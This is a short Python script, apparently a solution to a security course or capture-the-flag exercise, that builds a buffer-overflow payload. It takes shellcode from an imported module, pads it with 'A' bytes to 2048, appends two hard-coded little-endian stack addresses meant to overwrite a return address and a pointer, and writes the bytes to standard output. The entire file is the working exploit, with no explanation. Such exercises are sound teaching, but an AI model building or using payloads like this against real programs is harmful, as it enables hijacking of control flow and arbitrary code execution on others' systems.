from shellcode import shellcode
import sys

payload = shellcode

padding_length = 2048 - len(shellcode)
payload += b"A" * padding_length

a = (0xfff6b238).to_bytes(4, "little")
payload += a

p = (0xfff6ba4c).to_bytes(4, "little")
payload += p

sys.stdout.buffer.write(payload)